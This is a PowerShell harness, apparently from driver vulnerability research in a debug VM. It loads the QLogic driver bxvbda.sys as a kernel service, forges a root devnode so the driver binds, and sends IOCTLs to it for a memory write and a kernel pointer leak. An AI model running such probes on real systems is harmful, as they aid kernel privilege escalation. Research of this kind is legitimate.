# t7 phase E: bxvbda.sys gate attempt — t1/t3-proven recipe (devnode FIRST, seed AFTER)
$ErrorActionPreference = 'Continue'
$out = 'C:\Users\vmdebug\Desktop\t7_work\t7_bxv.txt'
"t7_bxv $(Get-Date -Format o)" | Out-File $out -Encoding ascii
function Log([string]$s) { $s | Out-File $out -Append -Encoding ascii }
$work = 'C:\Users\vmdebug\Desktop\t7_work'
$csc = 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe'

Log "recompile poc"
Log (& $csc /nologo /out:"$work\t7_poc.exe" /target:exe "$work\t7_poc.cs" 2>&1 | Out-String)
Log "compile exit=$LASTEXITCODE"

# 0. ground truth: guest bxvbda.sys hash (audited SHA = FEB2771428706126FEA1CC9A50EBE3CF4F8E8FB6FCB3CA19996497CA44FDAC45)
Log "=== guest bxvbda.sys SHA-256 (expect FEB27714...DAC45) ==="
Log ((Get-FileHash 'C:\Windows\System32\drivers\bxvbda.sys' -Algorithm SHA256).Hash)

# 1. service (isolated t7 namespace; b06bdrv pre-existing service left untouched)
Log "=== sc create t7_bxv ==="
Log (sc.exe create t7_bxv type= kernel start= demand binPath= 'C:\Windows\System32\drivers\bxvbda.sys' 2>&1 | Out-String)
Log "=== sc start t7_bxv ==="
Log (sc.exe start t7_bxv 2>&1 | Out-String)

# 2. stale-key check (clean baseline verified in t7_inv)
Log "=== enum key pre-check ==="
Log ("ROOT\T7BXV key present: " + (Test-Path 'HKLM:\SYSTEM\CurrentControlSet\Enum\ROOT\T7BXV'))

# 3. devnode FIRST (flags=0)
Log "=== CM_Create_DevNodeW ROOT\T7BXV\0000 ==="
& "$work\t7_poc.exe" $out mkdev 'ROOT\T7BXV\0000' 'HTREE\ROOT\0'

# 4. seed enum key AFTER
Log "=== seed enum key ==="
$ek = 'HKLM:\SYSTEM\CurrentControlSet\Enum\ROOT\T7BXV\0000'
New-ItemProperty -Path $ek -Name ConfigFlags -Value 0 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path $ek -Name Class -Value 'System' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $ek -Name ClassGUID -Value '{4d36e97d-e325-11ce-bfc1-08002be10318}' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $ek -Name DeviceDesc -Value 't7 QLogic VBD stand-in' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $ek -Name HardwareID -Value 'ROOT\T7BXV' -PropertyType MultiString -Force | Out-Null
New-ItemProperty -Path $ek -Name Service -Value 't7_bxv' -PropertyType String -Force | Out-Null
Log ("seeded: " + ((Get-ItemProperty $ek).Service) + " / " + ((Get-ItemProperty $ek).HardwareID -join ';'))

# 5. restart device
Log "=== pnputil /restart-device ==="
Log (pnputil.exe /restart-device 'ROOT\T7BXV\0000' 2>&1 | Out-String)

# 6. devnode status
Log "=== devnode status after restart ==="
& "$work\t7_poc.exe" $out devstat 'ROOT\T7BXV\0000'

# 7. interface check
Log "=== interface {2AF67184-48d3-4e8e-a3ff-969eff740ed2} in DeviceClasses ==="
$dc = 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceClasses\{2af67184-48d3-4e8e-a3ff-969eff740ed2}'
if (Test-Path $dc) {
  foreach ($ik in (Get-ChildItem $dc)) {
    $pp = Get-ItemProperty $ik.PSPath
    Log ("  instance: " + $ik.PSChildName + " DeviceInstance=" + $pp.DeviceInstance)
  }
} else { Log "  ABSENT (AddDevice did not register interface or failed earlier)" }

# 8. open probes on the interface
$ifp = '\\?\ROOT#T7BXV#0000#{2af67184-48d3-4e8e-a3ff-969eff740ed2}'
Log "=== open probes on $ifp ==="
foreach ($acc in 'c0000000','120089','0') {
  & "$work\t7_poc.exe" $out open $ifp $acc 3
}

# 9. DACL if openable — controlled by rc: if open succeeded, the next lines run
# (script logic: probe open via .NET first)
Log "=== conditional deep step (only if open succeeded) ==="
$h = $null
try {
  $h = [System.IO.File]::Open($ifp, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
  Log "NET open OK"
} catch { Log "NET open failed: $($_.Exception.Message)" }
if ($h) {
  $h.Close()
  Log "--- interface OPENABLE: running SAFE probes (in-window write + ctx-ptr leak) ---"
  # 0x80002024 SAFE in-window: {offset=0x7F00, count=1, data=0} — mission-approved probe
  & "$work\t7_poc.exe" $out ioctl $ifp 80002024 10 40 007f00000100000000000000
  # 0x80002050 ctx-ptr leak (fixed-size getter per audit)
  & "$work\t7_poc.exe" $out ioctl $ifp 80002050 0 40
  & "$work\t7_poc.exe" $out ioctl $ifp 80002050 10 40
  & "$work\t7_poc.exe" $out ioctl $ifp 80002050 10 1000
  & "$work\t7_poc.exe" $out dacl $ifp
} else {
  Log "--- interface NOT openable -> no probes dispatched (gate documented) ---"
}
Log "=== end t7_bxv ==="
"t7_bxv boundary $(Get-Date -Format o)" | Out-File "$work\t7_alive.txt" -Encoding ascii
exit 0
